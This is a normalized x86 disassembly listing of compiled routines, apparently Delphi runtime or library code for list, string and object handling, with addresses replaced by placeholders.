jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_418a58
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax esi
call sub_41b8d0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_418a98
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418b4e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fb8
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4030e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404184
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4030e0
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b55
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_418b74
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_418c09
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4030e0
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_404184
mov eax ebx
mov si 0xffff
call sub_40338c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c10
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax ebx
mov si 0xffff
call sub_40338c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_40338c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4042a0
sub_418c1b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4033e4
mov eax ebx
mov si 0xffff
call sub_40338c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_40338c
push eax
lea eax [ ebx + 0x4 ]
call sub_40578c
mov ecx eax
mov edx r-xdata
pop eax
call sub_403244
sub_418c66
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_418c98
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_418cb8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403244
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_418ce0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_40578c
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_40338c
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax edi
call sub_40578c
mov edx eax
mov eax esi
call sub_418ce0
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_40578c
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_418d78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_418dcd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_40578c
mov edx eax
mov eax edi
call sub_418ce0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418dd4
lea eax [ ebp - 0x4 ]
call sub_40578c
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_418ddc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_418e14
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_418e44
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_418e80
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4030e0
mov edx esp
mov eax esi
call sub_404184
add esp 0x100
pop esi
pop ebx
retn
sub_418ea8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_418f3d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_4030e0
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_404184
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_40338c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_418e68
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d6c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418f44
lea eax [ ebp - 0x14 ]
call sub_403f20
retn
sub_418f60
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_419460
mov edx ebx
mov eax esi
call sub_4193f8
sub_418f90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_418e68
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_418564
mov dl 0x1
mov eax ebx
call sub_418e44
sub_418fc0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_418d78
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_41900c
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_418d78
mov eax [ esi + 0x8 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418a58
test bl bl
jle r-xdata
mov eax esi
call sub_419124
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_419058
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_419078
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418a84
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4190f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419124
mov eax esi
call sub_4191f8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_419200
push eax
mov eax [ ebp - 0x4 ]
call sub_419058
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_419124
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41917e
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_418558
call sub_403190
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_419198
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx esi
call sub_418470
cmp ebp [ eax + 0x8 ]
je r-xdata
sub_4191d8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419200
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_419214
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4192c2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_4030e0
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_404184
mov eax ebx
mov si 0xffff
call sub_40338c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4192c9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
mov eax ebx
mov si 0xffff
call sub_40338c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_40338c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4192dc
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_4042a0
sub_4192dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_403f74
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_40338c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4033d0
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4033d0
call sub_4147fc
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_4026dc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4193d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4033d0
mov edx [ ebp - 0xc ]
call sub_414a00
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4026fc
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_414a84
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_404184
sub_4193f8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_40331c
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418314
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_419114
xor ecx ecx
mov edx esi
mov eax ebx
call sub_418d78
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_4183fc
sub_419460
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_418558
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41860c
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_418360
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_418d78
mov eax ebx
call sub_419114
pop edi
pop esi
pop ebx
retn
sub_4194c4
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_4194e8
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a040
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_419518
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41953c
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_419560
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419607
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4196b0
xor eax eax
push ebp
push sub_4195ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4195f1
mov eax [ ebp - 0x4 ]
call sub_41976c
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_419618
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418a84
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4196b0
xor eax eax
push ebp
push sub_419698
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41976c
retn
sub_4196c8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419780
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_419720
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_419ed8
mov eax [ ebp - 0x8 ]
push eax
push sub_41a188
push ebp
call sub_4196c8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419780
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419815
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41981c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f44
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_40432c
jne r-xdata
sub_41982c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_419828
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
jmp sub_40395c
sub_419864
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4198ac
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405c50
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41982c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4198b3
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_4198bc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419994
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4196b0
xor eax eax
push ebp
push sub_419972
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419979
mov eax [ ebp - 0x4 ]
call sub_41976c
retn
sub_4199b0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4199f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4043e0
call sub_4088b0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4199fc
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_419a04
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419b0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_403fb8
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_404010
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419b16
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f44
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4041e0
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_4041e0
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_4041e0
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028d8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028d8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4041e0
mov ebx eax
test ebx ebx
je r-xdata
sub_419b2c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419ba4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419bab
lea eax [ ebp - 0xc ]
call sub_403f20
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_419bb8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419c7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
